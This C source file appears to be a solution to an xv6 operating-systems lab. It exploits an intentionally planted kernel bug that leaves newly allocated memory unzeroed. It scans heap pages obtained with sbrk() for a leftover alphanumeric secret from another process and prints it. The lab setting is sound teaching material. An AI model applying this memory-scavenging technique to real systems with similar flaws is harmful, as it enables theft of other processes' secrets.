/*
 * attack.c - exploit unzeroed memory to find a secret from a previous process
 *
 * The LAB_SYSCALL bug means newly allocated memory retains contents
 * from its previous use. This program allocates a large block of memory
 * via sbrk() and scans it for the secret string left by secret.c.
 *
 * The secret is guaranteed to contain only digits and upper/lower case letters.
 * We look for runs of alphanumeric characters that look like a secret.
 */
#include "kernel/types.h"
#include "kernel/param.h"
#include "user/user.h"

#define SCAN_PAGES 128
#define PAGE_BYTES 4096
#define MAX_CANDIDATE 256

/* Check if a character is alphanumeric (digit, uppercase, or lowercase letter) */
static int
alphanumeric(char c)
{
  return (c >= '0' && c <= '9') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= 'a' && c <= 'z');
}

int
main(void)
{
  char *memory;
  int size = SCAN_PAGES * PAGE_BYTES;
  int offset = 0;

  /* Allocate a large block of memory via sbrk */
  memory = sbrk(size);
  if (memory == SBRK_ERROR)
    exit(1);

  /*
   * Scan through the allocated memory looking for sequences of
   * alphanumeric characters followed by a null terminator.
   * These could be the secret left behind by secret.c.
   *
   * The secret program calls sbrk(strlen(secret)+1) and then strcpy's
   * the secret into it. So we're looking for a null-terminated alphanumeric
   * string sitting in a page that was previously freed.
   *
   * We print the longest such candidate we find.
   */
  char best[MAX_CANDIDATE];
  int best_len = 0;

  while (offset < size) {
    /* Look for a null-terminated alphanumeric string */
    if (alphanumeric(memory[offset])) {
      int start = offset;
      int len = 0;
      int valid = 1;

      /* Count consecutive alphanumeric characters */
      while (offset < size && memory[offset] != '\0') {
        if (!alphanumeric(memory[offset])) {
          valid = 0;
          break;
        }
        len++;
        offset++;
      }

      /*
       * A valid secret candidate:
       * - Consists entirely of alphanumeric chars
       * - Is followed by a null byte
       * - Has a reasonable length (at least 1 char)
       */
      if (valid && offset < size && memory[offset] == '\0' && len > 0) {
        if (len > best_len && len < MAX_CANDIDATE) {
          best_len = len;
          memmove(best, memory + start, len);
          best[len] = '\0';
        }
      }
    }
    offset++;
  }

  if (best_len > 0) {
    printf("%s\n", best);
  }

  exit(0);
}
